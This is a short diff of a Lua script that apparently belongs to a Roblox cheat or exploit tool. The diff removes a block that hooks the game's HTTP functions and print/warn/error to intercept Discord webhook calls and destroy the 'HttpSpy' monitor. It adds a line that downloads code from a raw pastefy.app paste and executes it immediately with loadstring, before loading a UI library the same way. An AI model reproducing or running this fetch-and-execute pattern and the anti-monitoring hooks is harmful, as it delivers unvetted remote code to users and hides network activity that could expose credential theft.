@@ -1,52 +1,5 @@
-local function disableHttpSpyForDiscordWebhooks()
-    local function destroyHttpSpy()
-        local HttpSpy = game.CoreGui:FindFirstChild("HttpSpy")
-        if HttpSpy then
-            HttpSpy:Destroy()
-            print("HttpSpy detected and destroyed.")
-        end
-    end
-
-    destroyHttpSpy()
-
-    game.CoreGui.ChildAdded:Connect(function(child)
-        if child.Name == "HttpSpy" then
-            child:Destroy()
-            print("Attempted creation of HttpSpy detected and destroyed.")
-        end
-    end)
-
-    local function isDiscordWebhookUrl(url)
-        return url and url:lower():find("discord%.com/api/webhooks/")
-    end
-
-    local function blockFunction(func)
-        return function(...)
-            local info = debug.info(2, "s")
-            local url = select(1, ...)
-            if isDiscordWebhookUrl(url) then
-                destroyHttpSpy()
-            else
-                return func(...)
-            end
-        end
-    end
-
-    game.HttpGet = blockFunction(game.HttpGet)
-    game.HttpPost = blockFunction(game.HttpPost)
-    game.HttpGetAsync = blockFunction(game.HttpGetAsync)
-    game.HttpPostAsync = blockFunction(game.HttpPostAsync)
-    game.GetObjects = blockFunction(game.GetObjects)
-
-    print = blockFunction(print)
-    warn = blockFunction(warn)
-    error = blockFunction(error)
-
-end
-
-disableHttpSpyForDiscordWebhooks()
-
-
+loadstring(game:HttpGet("https://pastefy.app/1HIgOYwI/raw"))()
+wait(.1)
 local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
 
 OrionLib:MakeNotification({
